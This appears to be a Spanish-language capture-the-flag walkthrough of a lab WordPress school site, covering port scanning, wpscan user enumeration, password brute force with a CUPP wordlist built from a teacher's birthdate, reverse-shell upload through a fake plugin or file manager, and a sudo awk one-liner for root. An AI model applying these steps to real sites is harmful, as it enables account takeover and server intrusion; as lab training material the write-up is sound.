PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos al puerto 80 y vemos una web de un colegio

-Entramos en el apartado de profesores en /profesores.html y vemos una lista de profesores

-El más interesante en luis (wordpress admin)

-Hacemos fuzzing y encontramos una ruta /wordpress

-Escaneamos el sitio con wpscan y encontramos el usuario luisillo:
	-wpscan --url http://escolares.dl/wordpress -e ap,u
		[i] User(s) Identified:
		[+] luisillo

-No encontramos plugins vulnerables, parece que la intrusión va a ser por fuerza bruta

-Probamos a aplicar fuerza bruta con el usuario luisillo con wpscan a wordpress y con hydra a ssh. Sin embargo no encontramos la contraseña con el diccionario 'rockyou.txt'

-Vamos a utilizar una herramienta llamada CUPP (Common User Passwords Profiler), que sirve para crear diccionarios personalizados. 

-Ejecutamos la herramienta y proporcionamos la información del usuario luisillo que hay en /profesores.html
	-First name: luisillo
	-Surname: luis
	-nickname: admin wordpress
	-Birthdate (DDMMYYYY): 09101981
	-Todas la demas opciones lo dejamos en blanco y las últimas 4 ponemos N

-Nos ha generado un diccionario personalizado 'luisillo.txt' , que vamos a utilizar con wpscan para descubrir la contraseña de luisillo:
	-wpscan --url http://escolares.dl/wordpress -U luisillo -P luisillo.txt 
		Username: luisillo, Password: Luis1981

-Nos autenticamos en la siguiente ruta con las credenciales obtenidas:
	-http://escolares.dl/wordpress/wp-login.php

-No he conseguido editar un template y que interprete el código php para mandarme la reverse shell como de costumbre. 

-2 Formas de ganar acceso:
	1-Subiendo un plugin .zip con código PHP:
		-Creamos un archivo PHP con los siguientes comentarios y debajo la PHP reverse shell:
			/*
				Plugin Name:  Pwned                     
				Plugin URI:   https://www.wpbeginner.com
				Description:  A short little description of the plugin. It will be displayed on the Plugins page in WordPress admin area.
				Version:      1.0
				Author:       WPBeginner
				Author URI:   https://www.wpbeginner.com
			aa*/
			php exec /bin/bash ....
		-Lo comprimimos en zip y lo subimos como plugin:
			-Comprimirlo en zip:
				-zip -r exploit.zip exploit.php 
		-Subimos el archivo .zip:
			-Plugins --> Subir Plugin --> Instalar ahora --> Activar (Mientras estamos en escucha)
	2-Subiendo un archivo PHP mediante el plugin instalado 'Wp File Manager PRO':
		-He entrado en el plugin 'Wp File Manager PRO' , he seleccionado la opción de 'subir archivo .html' y después he cambiado la extensión a .php y he insertado la reverse shell de PentestMonkey.
		-La he ejecutado desde la siguiente URL:
			-http://escolares.dl/wordpress/wp-content/uploads/test.php
			www-data@7ff21403fabf:/$
## Escalada de Privilegios

-En /home encontramos el siguiente archivo:
	-cat secret.txt:
		luisillopasswordsecret

-Pivotamos al usuario luisillo y enumeramos los comandos que puede ejecutar como sudo:
	-su luisillo
	-password: luisillopasswordsecret
	-sudo -l:
		(ALL) NOPASSWD: /usr/bin/awk

-Buscamos en Gtfobins y abusamos de '/usr/bin/awk' para escalar a root:
	-sudo awk 'BEGIN {system("/bin/sh")}'
	root@7ff21403fabf:/home# whoami
	root

